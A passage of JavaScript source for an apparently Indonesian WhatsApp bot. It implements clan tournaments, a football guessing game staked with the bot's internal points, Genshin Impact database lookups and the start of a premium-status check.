  if (upgradeClan.level < upgradeClan.clanTasks.target) {
    upgradeClan.level += 1;
    upgradeClan.clanTasks.progress += 1;
    writeClans(clans);
    await reply(
      `Clan ${upgradeClan.clan} has been successfully upgraded to level ${upgradeClan.level}.`,
    );
  } else {
    await reply(
      "Your clan has already reached the maximum level for the current task.",
    );
  }
  break;

case "tournament":
if (isBan) return XRB()
await XReaction()
  const subAction = param1;

  switch (subAction) {
    case "create":
      if (!param2)
        return reply(
          "Please enter the name of the tournament you want to create.",
        );

      let tournamentName = param2;
      if (!clans.tournaments) {
        clans.tournaments = {};
      }

      if (clans.currentTournament)
        return reply(
          "A tournament is currently ongoing. Please wait until the current tournament is over.",
        );

      if (clans.tournaments[tournamentName])
        return reply("A tournament with that name already exists.");

      clans.currentTournament = tournamentName;

      clans.tournaments[tournamentName] = {
        name: tournamentName,
        participants: [],
        status: "pending",
        matches: [],
      };

      writeClans(clans);
      await reply(`Tournament ${tournamentName} has been successfully created.`);
      break;

    case "join":
if (isBan) return XRB()
await XReaction()
      let currentTournamentName = clans.currentTournament;
      if (!currentTournamentName)
        return reply("No tournament is currently ongoing.");

      let joinTournament = clans.tournaments[currentTournamentName];

      let joinUserClan = Object.values(clans).find(
        (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
      );
      if (!joinUserClan)
        return reply(
          "You do not have a clan to join the tournament.",
        );

      if (joinTournament.participants.includes(joinUserClan.clan))
        return reply("Your clan is already registered for this tournament.");

      joinTournament.participants.push(joinUserClan.clan);
      writeClans(clans);
      await reply(
        `Clan ${joinUserClan.clan} has been successfully registered for the ${currentTournamentName} tournament.`,
      );
      break;

    case "start":
if (isBan) return XRB()
await XReaction()
      let startTournamentName = clans.currentTournament;
      if (!startTournamentName)
        return reply("No tournament is currently ongoing.");

      let startTournament = clans.tournaments[startTournamentName];

      if (startTournament.status !== "pending")
        return reply("The tournament has already started or ended.");

      if (
        startTournament.participants.length < 2 ||
        startTournament.participants.length % 2 !== 0
      ) {
        return reply(
          "The number of tournament participants must be even and at least 2 clans to start.",
        );
      }

      startTournament.participants =
        startTournament.participants.sort(
          () => Math.random() - 0.5,
        );

      while (startTournament.participants.length > 1) {
        for (
          let i = 0;
          i < startTournament.participants.length;
          i += 2
        ) {
          if (startTournament.participants[i + 1]) {
            startTournament.matches.push({
              clan1: startTournament.participants[i],
              clan2: startTournament.participants[i + 1],
              status: "pending",
            });
          }
        }
        startTournament.participants =
          startTournament.participants.filter(
            (_, index) => index % 2 === 0,
          );
      }

      startTournament.status = "ongoing";
      clans.currentTournament = startTournamentName;
      writeClans(clans);

      await reply(`Tournament ${startTournamentName} has started!`);

      startNextMatch(startTournament);
      break;

    case "status":
if (isBan) return XRB()
await XReaction()
      let statusTournamentName = clans.currentTournament;
      if (!statusTournamentName)
        return reply("No tournament is currently ongoing.");

      let statusTournament =
        clans.tournaments[statusTournamentName];

      let statusText = `*Tournament Status ${statusTournamentName}:*\n\n`;
      statusText += `Status: ${statusTournament.status}\n`;
      statusText += `Participants: ${statusTournament.participants.join(", ")}\n\n`;
      statusText += `Match List:\n`;
      statusTournament.matches.forEach((match, index) => {
        statusText += `${index + 1}. ${match.clan1} vs ${match.clan2} - ${match.status === "completed" ? "Completed" : "Pending"}\n`;
      });

      await reply(statusText.trim());
      break;

    default:
      await reply(
        "Invalid tournament command. Use create, join, start, or status.",
      );
      break;
  }
  break;

default:
  await reply(
    "Unknown command. Please use create, join, approve, war, list, leave, delete, member, missions, task, upgrade, or tournament.",
  );
  break;
}
}

case 'judi':{
if (isBan) return XRB()
await XReaction()
Alice.jbRooms = Alice.jbRooms || {};
  Alice.jbVotes = Alice.jbVotes || {};

  // Daftar klub yang tersedia
  const clubs = [
    "Real Madrid", "Manchester United", "Inter Milan", "Barcelona",
    "Liverpool", "Paris Saint-Germain", "Chelsea", "Juventus",
    "Borussia Dortmund", "Atletico Madrid", "RB Leipzig", "Porto",
    "Arsenal", "Shakhtar Donetsk", "Red Bull Salzburg", "AC Milan",
    "Braga", "PSV Eindhoven", "Lazio", "Red Star Belgrade", "FC Copenhagen"
  ];

  // Fungsi untuk mengacak array
  const shuffleArray = (array) => {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  };

  // Fungsi untuk menghitung vote
  const countVotes = (votes) => {
    const voteCount = { "1": 0, "2": 0 };
    Object.values(votes).forEach(vote => {
      if (voteCount[vote] !== undefined) {
        voteCount[vote]++;
      }
    });
    return voteCount;
  };

  // Handle perintah tanpa argumen atau dengan argumen 'help'
  if (!args[0] || args[0] === "help") {
    const message = `*❏ JUDI BOLA⚽*

${emojipick}.judi create (buat room) 
${emojipick}.judi join (player join, taruhan 10)
${emojipick}.judi player (daftar pemain yang bergabung)
${emojipick}.judi mulai (mulai game)
${emojipick}.judi vote 1/2 (vote klub pilihan)
${emojipick}.judi delete (hapus sesi room game)

Buatkan sebuah permainan tebak pertandingan bola, contoh: 1 Braga vs 2 Lazio

Untuk pilihan, gunakan ${Xyroo}jb vote 1 atau 2

Minimal player yang bergabung untuk memulai game adalah 2 pemain.

Taruhan: 10 Limit
Hadiah: 200 Limit`;
    await Alice.sendMessage(m.chat, {
      text: message,
      contextInfo: {
        externalAdreply: {
          title: botname,
          body: 'Ayo ikut dan menangkan hadiahnya!',
          thumbnailUrl: 'https://telegra.ph/file/3463760976052aeac5f21.jpg',
          sourceUrl: ``,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
    return;
  }

  // Logika berdasarkan argumen pertama
  switch (args[0].toLowerCase()) {
    case 'create':
if (isBan) return XRB()
await XReaction()
      // Logika untuk membuat room
      if (Alice.jbRooms[m.chat]) {
        return reply('Room sudah ada.');
      }
      Alice.jbRooms[m.chat] = {
        players: [],
        gameStarted: false,
        clubs: [],
        limit: 0 // Inisialisasi limit untuk taruhan
      };
      reply('Room berhasil dibuat. Pemain sekarang bisa bergabung.');
      break;

    case 'join':
if (isBan) return XRB()
await XReaction()
      // Logika agar pemain bergabung ke room
      if (!Alice.jbRooms[m.chat]) {
        return reply('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      if (Alice.jbRooms[m.chat].gameStarted) {
        return reply('Game sudah dimulai. Tidak bisa bergabung sekarang.');
      }
      if (Alice.jbRooms[m.chat].players.find(p => p.id === m.sender)) {
        return reply('Anda sudah bergabung di room.');
      }
      const playerName = m.pushName || Alice.getName(m.sender);
      Alice.jbRooms[m.chat].players.push({ id: m.sender, name: playerName });
      Alice.jbRooms[m.chat].limit += 10; // Tambahkan taruhan ke Limit
      reply(`Anda berhasil bergabung di room. Anda telah memasang taruhan sebesar 10. Total taruhan: ${Alice.jbRooms[m.chat].limit}`);
      break;

    case 'player':
if (isBan) return XRB()
await XReaction()
      // Logika untuk daftar pemain yang bergabung
      if (!Alice.jbRooms[m.chat]) {
        return reply('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      const players = Alice.jbRooms[m.chat].players;
      reply(`Pemain yang bergabung: \n${players.map(p => `${p.name} (${p.id})`).join('\n')}`);
      break;

    case 'mulai':
if (isBan) return XRB()
await XReaction()
      // Logika untuk memulai game
      if (!Alice.jbRooms[m.chat]) {
        return reply('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      if (Alice.jbRooms[m.chat].players.length < 2) {
        return reply('Minimal 2 pemain untuk memulai game.');
      }
      shuffleArray(clubs);
      Alice.jbRooms[m.chat].clubs = [clubs[0], clubs[1]];
      Alice.jbRooms[m.chat].gameStarted = true;
      reply(`Game dimulai! Pertandingan: 1 ${clubs[0]} vs 2 ${clubs[1]}. Silakan vote klub pilihan Anda.`);
      break;

    case 'vote':
if (isBan) return XRB()
await XReaction()
      // Logika untuk vote
      if (!Alice.jbRooms[m.chat]) {
        return reply('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      if (!Alice.jbRooms[m.chat].gameStarted) {
        return reply('Game belum dimulai. Gunakan .jb mulai untuk memulai game.');
      }
      if (!args[1] || !['1', '2'].includes(args[1])) {
        return reply('Pilihan tidak valid. Gunakan .jb vote 1 atau 2.');
      }
      const vote = args[1];
      const currentRoom = Alice.jbRooms[m.chat];
      const player = currentRoom.players.find(p => p.id === m.sender);
      if (!player) {
        return reply('Anda belum bergabung dalam room.');
      }
      Alice.jbVotes[m.sender] = vote;
      reply(`Anda memilih klub nomor ${vote}.`);

      // Cek apakah semua pemain sudah melakukan vote
      const voteCount = countVotes(Alice.jbVotes);
      if (Object.keys(Alice.jbVotes).length === currentRoom.players.length) {
        reply('Semua pemain telah vote. Pertandingan akan segera dimulai...');

        // Jeda 25 detik
        setTimeout(() => {
          reply('Pertandingan telah dimulai. Mohon tunggu sampai pertandingan selesai...');

          // Jeda untuk simulasi pertandingan
          setTimeout(() => {
            // Tentukan pemenang berdasarkan vote terbanyak
            const winnerVote = voteCount["1"] > voteCount["2"] ? "1" : "2";
            const winningClub = currentRoom.clubs[winnerVote - 1];
            const winners = currentRoom.players.filter(player => Alice.jbVotes[player.id] === winnerVote);

            reply(`Pertandingan telah selesai.\nPemenang adalah ${winningClub}.\nPemain yang memilih ${winningClub}:\n${winners.map(w => w.name).join('\n')}\n\nSelamat kepada para pemenang mendapatkan 200.`);            
    let users = global.db.data.users
    // Checking if the user is in the database, if not, initialize their limit to 0
    if (!users[winningClub]) users[winningClub] = { limit: 0 }
    users[winningClub].limit += 200

            // Bersihkan room dan votes setelah pertandingan selesai
            delete Alice.jbRooms[m.chat];
            delete Alice.jbVotes[m.chat];
          }, 25000); // Jeda 25 detik untuk simulasi pertandingan
        }, 25000); // Jeda 25 detik sebelum pertandingan dimulai
      }
      break;

    case 'delete':
if (isBan) return XRB()
await XReaction()
      // Logika untuk menghapus room
      if (!Alice.jbRooms[m.chat]) {
        return reply('Belum ada room yang dibuat.');
      }
      delete Alice.jbRooms[m.chat];
      delete Alice.jbVotes[m.chat];
      reply('Room telah dihapus.');
      break;

    default:
      reply('Perintah tidak dikenal. Gunakan .judi untuk melihat daftar perintah.');
  }
};
break

case 'gens-wildlife':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} snowboar*\nHarap berikan nama binatang liar.`);
  try {
    let result = await genshindb.wildlife(text);
    if (result) {
      let response = `*Binatang Liar Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Habitat:* ${result.habitat || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Binatang liar tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.wildlife("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Binatang liar yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-weapons':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh: *${XyrooRynzz} claymore*\nHarap berikan nama senjata.`);
  try {
    let result = await genshindb.weapons(text);
    if (result) {
      let response = `*Senjata Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Type:* ${result.type || "Data tidak tersedia"}\n` + `*Base ATK:* ${result.baseAttack || "Data tidak tersedia"}\n` + `*Substat:* ${result.subStat || "Data tidak tersedia"}\n` + `*Passive Name:* ${result.passiveName || "Data tidak tersedia"}\n` + `*Passive Description:* ${result.passiveDescription || "Data tidak tersedia"}\n` + (result.refinement ? `\n*Refinement (${result.refinement.refine}):* ${result.refinement.description || "Data tidak tersedia"}\n` : "");
      reply(response);
    } else {
      reply("Senjata tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.weapons("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Senjata yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-voiceovers':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply( `Contoh: *${XyrooRynzz} venti*\nHarap berikan nama voiceover.`);
  try {
    let result = await genshindb.voiceovers(text);
    if (result) {
      let response = `*Voiceover Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Voiceover tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.voiceovers("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Voiceover yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-viewpoint':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} starfell valley*\nHarap berikan nama pemandangan.`);
  try {
    let result = await genshindb.viewpoints(text);
    if (result) {
      let response = `*Pemandangan Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}`;
      reply(response);
    } else {
     reply("Pemandangan tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.viewpoints("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Pemandangan yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-talents':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} diluc*\nHarap berikan nama karakter untuk mencari bakatnya.`);
  try {
    let result = await genshindb.talents(text);
    if (result && result.length > 0) {
      let response = `*Bakat ditemukan untuk karakter ${text}:*\n\n`;
      result.forEach((talent, index) => {
        response += `*${index + 1}. ${talent.name}*\n`;
        response += `_${talent.description || "Deskripsi tidak tersedia"}_\n\n`;
        response += `*Jenis:* ${talent.type || "Data tidak tersedia"}\n`;
        response += `*Element:* ${talent.element || "Data tidak tersedia"}\n\n`;
      });
      reply(response);
    } else {
     reply(`Bakat untuk karakter '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    reply(`*Tidak Ditemukan*\n\n*Bakat untuk karakter '${text}' tidak ditemukan.`);
  }
};
break
case 'gens-potion':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} squirrel fish*\nHarap berikan nama ramuan atau makanan.`)
  try {
    let result = await genshindb.foods(text);
    if (result) {
      let response = `*Ramuan atau Makanan Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Efek:* ${result.effect || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply(`Ramuan atau makanan '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    try {
      let availableFoods = await genshindb.foods("names", {
        matchCategories: true
      });
      reply(`*List ${text} foods :*\n\n- ${availableFoods.join("\n- ")}`);
    } catch (error) {
      console.error(error);
      let availableFoods = await genshindb.foods("names", {
        matchCategories: true
      });
      reply(`*Not Found*\n\n*Available foods is :*\n${availableFoods.join(", ")}`);
    }
  }
};
break
case 'gens-outfit':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} outrider*\nHarap berikan nama kostum atau outfit.`);
  try {
    let result = await genshindb.outfits(text);
    if (result) {
      let response = `*Kostum Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Karakter:* ${result.character || "Data tidak tersedia"}`;
      if (result.url && result.url.modelviewer) {
        response += `\n_${result.url.modelviewer}_`;
      }
      reply(response);
    } else {
     reply(`Kostum '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    try {
      let availableOutfits = await genshindb.outfits(text, {
        matchCategories: true
      });
      reply(`*List ${text} outfit :*\n\n- ${availableOutfits.join("\n- ")}`);
    } catch (error) {
      console.error(error);
      let availableOutfits = await genshindb.outfits("names", {
        matchCategories: true
      });
      reply(`*Not Found*\n\n*Available outfits is:*\n${availableOutfits.join(", ")}`);
    }
  }
};
break
case 'gens-nation':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh: *${XyrooRynzz} mondstadt*\nHarap berikan nama wilayah atau nasionalitas.`);
  try {
    let result = await genshindb.geographies(text);
    if (result) {
      let response = `*Informasi Wilayah Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
      response += `*Region:* ${result.region || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Informasi wilayah tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.geographies("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Wilayah yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-namacard':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} anemo flare*\nHarap berikan nama kartu nama.`);
  try {
    let result = await genshindb.namecards(text);
    if (result) {
      let response = `*Kartu Nama Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Unlock:* ${result.unlock || "Data tidak tersedia"}`;
      reply(response);
    } else {
     reply("Kartu nama tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.namecards("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Kartu nama yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-materials':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} boreal wolf's milk*\nHarap berikan nama material.`);
  try {
    let result = await genshindb.materials(text);
    if (result) {
      let response = `*Material Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Type:* ${result.type || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Material tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.materials("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Material yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-food':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} temptation*\nHarap berikan nama makanan.`);
  try {
    let result = await genshindb.foods(text);
    if (result) {
      let response = `*Makanan Ditemukan: ${result.name}*\n\n`;
      response += `_"${result.description}"_\n\n`;
      response += `*Rarity:* ${result.rarity}\n`;
      response += `*Type:* ${result.foodtype}\n`;
      response += `*Category:* ${result.foodfilter} (${result.foodcategory})\n\n`;
      if (result.effect) {
        response += `*Effect:*\n${result.effect}\n\n`;
      }
      if (result.suspicious) {
        response += `*Suspicious:*\n${result.suspicious.effect}\n_"${result.suspicious.description}"_\n\n`;
      }
      if (result.normal) {
        response += `*Normal:*\n${result.normal.effect}\n_"${result.normal.description}"_\n\n`;
      }
      if (result.delicious) {
        response += `*Delicious:*\n${result.delicious.effect}\n_"${result.delicious.description}"_\n\n`;
      }
      reply(response);
    } else {
      reply("Makanan tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.foods("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Makanan yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-enemy':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply( `Contoh: *${XyrooRynzz} ruin guard*\nHarap berikan nama musuh.`);
  try {
    let result = await genshindb.enemies(text);
    if (result) {
      let response = `*Musuh Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Level:* ${result.level || "Data tidak tersedia"}\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Element:* ${result.element || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Musuh tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.enemies("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Musuh yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-emoji':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} anemo*\nHarap berikan nama emoji.`);
  try {
    let result = await genshindb.emojis(text);
    if (result) {
      let response = `*Emoji Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Emoji tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.emojis("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Emoji yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-domain':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} valley of remembrance*\nHarap berikan nama domain.`);
  try {
    let result = await genshindb.domains(text);
    if (result) {
      let response = `*Domain Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
      response += `*Level:* ${result.level || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Domain tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.domains("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Domain yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-craft':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} mystical enhancement ore*\nHarap berikan nama craft.`);
  try {
    let result = await genshindb.crafts(text);
    if (result) {
      let response = `*Craft Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Type:* ${result.type || "Data tidak tersedia"}\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Craft tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.crafts("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Craft yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-giconstellation':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} diluc*\nHarap berikan nama karakter untuk mencari konstelasinya.`);
  try {
    let result = await genshindb.constellations(text);
    if (result && result.length > 0) {
      let response = `*Konstelasi ditemukan untuk karakter ${text}:*\n\n`;
      result.forEach((constellation, index) => {
        response += `*${index + 1}. ${constellation.name}*\n`;
        response += `_${constellation.effect}_\n\n`;
        response += `*Unlock At:* C${constellation.unlock || "Data tidak tersedia"}`;
        if (index < result.length - 1) response += "\n\n";
      });
      reply(response);
    } else {
      reply(`Konstelasi untuk karakter '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    reply(`*Tidak Ditemukan*\n\n*Konstelasi untuk karakter '${text}' tidak ditemukan.`);
  }
};
break
case 'gens-giartifact':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply( `Contoh: *${XyrooRynzz} berserker*\nHarap berikan nama artefak.`);
  try {
    let result = await genshindb.artifacts(text);
    if (result) {
      let response = `*Artefak Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Set:* ${result.set || "Data tidak tersedia"}\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Slot:* ${result.slot || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Artefak tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.artifacts("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Artefak yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-area':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh: *${XyrooRynzz} liyue*\nHarap berikan nama tempat.`);
  try {
    let result = await genshindb.geographies(text);
    if (result) {
      let response = `*Info Geografi: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
      response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
      response += `*Urutan Sortir:* ${result.sortorder || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Geografi tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.geographies("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Geografi yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-animals':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply( `Contoh: *${XyrooRynzz} shiba*\nHarap berikan nama hewan.`);
  try {
    let animal = await genshindb.animals(text);
    if (animal) {
      let response = `*Hewan Ditemukan: ${animal.name}*\n\n`;
      response += `"${animal.description}"\n\n`;
      response += `*Kategori:* ${animal.category || ""}\n`;
      response += `*Jenis Hitungan:* ${animal.counttype || ""}\n`;
      response += `_${animal.sortorder ? `Urutan Sortir: ${animal.sortorder}` : ""}_`;
      reply(response);
    } else {
      reply("Hewan tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    try {
      let animalCategories = await genshindb.animals(text, {
        matchCategories: true
      });
      reply(`*Kategori Hewan ${text} :*\n\n- ${animalCategories.join("\n- ")}`);
    } catch (error) {
      console.error(error);
      let allAnimalNames = await genshindb.animals("names", {
        matchCategories: true
      });
      reply(`*Tidak Ditemukan*\n\n*Hewan yang tersedia:* ${allAnimalNames.join(", ")}`);
    }
  }
};
break
case 'gens-advrank':{
if (isBan) return XRB()
await XReaction()
    if (!text || isNaN(parseInt(text))) {
      return reply(`Masukkan nomor peringkat petualang yang valid. Contoh: *${XyrooRynzz} 5*`);
    }
    try {
    let rankNumber = parseInt(text);
    let result = await genshindb.adventureranks(rankNumber);
    if (result) {
      let response = `*Rank Petualang Ditemukan untuk Rank ${rankNumber}:*\n\n`;
      response += `*Experience:* ${result.exp || "Data tidak tersedia"}\n`;
      response += `*Reward:* ${result.reward || "Data tidak tersedia"}\n`;
      response += `*Deskripsi:* ${result.description || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply(`Rank petualang untuk Rank ${rankNumber} tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    let availableRanks = await genshindb.adventureranks("names");
    reply(`*Tidak Ditemukan*\n\n*Rank petualang yang tersedia:* ${availableRanks.join(", ")}`);
  }
};
break
case 'gens-giachievement':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply( `Contoh: *${XyrooRynzz} mondstadt*\nHarap berikan nama prestasi.`);
  try {
    let result = await genshindb.achievements(text);
    if (result) {
      let response = `*${result.name}*\n`;
      response += `_${result.description}_\n\n`;
      response += `*Kategori:* ${result.category || ""}\n`;
      response += `*Rarity:* ${result.rarity || ""}\n`;
      response += `*Detail:* ${result.detail || ""}\n`;
      response += `*Cara Mendapatkan:* ${result.howToObtain || ""}\n`;
      reply(response);
    } else {
      reply("Prestasi tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.achievements("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Prestasi yang tersedia:* ${available.join(", ")}`);
  }
};
break

case 'gens-characters':{
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: *${XyrooRynzz} diluc*\nHarap berikan nama karakter.`);
  try {
    let result = await genshindb.characters(text);
    if (result) {
      let response = `*Karakter Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Vision:* ${result.vision || "Data tidak tersedia"}\n`;
      response += `*Senjata:* ${result.weapon || "Data tidak tersedia"}`;
      reply(response);
    } else {
      reply("Karakter tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.characters("names", {
      matchCategories: true
    });
    reply(`*Tidak Ditemukan*\n\n*Karakter yang tersedia:* ${available.join(", ")}`);
  }
};
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Game Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Main Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'cekprem': {
  const fs = require('fs');
  const premPath = './AliceDatabase/premium.json';
  if (!fs.existsSync(premPath)) fs.writeFileSync(premPath, '[]');

  const premium = JSON.parse(fs.readFileSync(premPath));
  const user = m.sender.replace(/[^0-9]/g, '');
  const now = Math.floor(Date.now() / 1000);
  
  function formatSisaWaktu(seconds) {
  const days = Math.floor(seconds / 86400);
  seconds %= 86400;
  const hours = Math.floor(seconds / 3600);
  seconds %= 3600;
  const minutes = Math.floor(seconds / 60);
  return `${days} hari, ${hours} jam, ${minutes} menit`;
 }
 
  const data = premium.find(v => v.id === user);

  if (!data) {
    return reply(`❌ Kamu belum menjadi user premium.`);
  }

  if (data.expired === 0) {
    return reply(`👑 Kamu adalah *User Premium Selamanya* 🥳`);
  }

  if (data.expired < now) {
    return reply(`⚠️ Status premium kamu sudah *expired* sejak ${new Date(data.expired * 1000).toLocaleString('id-ID')}`);
  }

  const sisa = data.expired - now;
  const tanggal = new Date(data.expired * 1000).toLocaleString('id-ID');

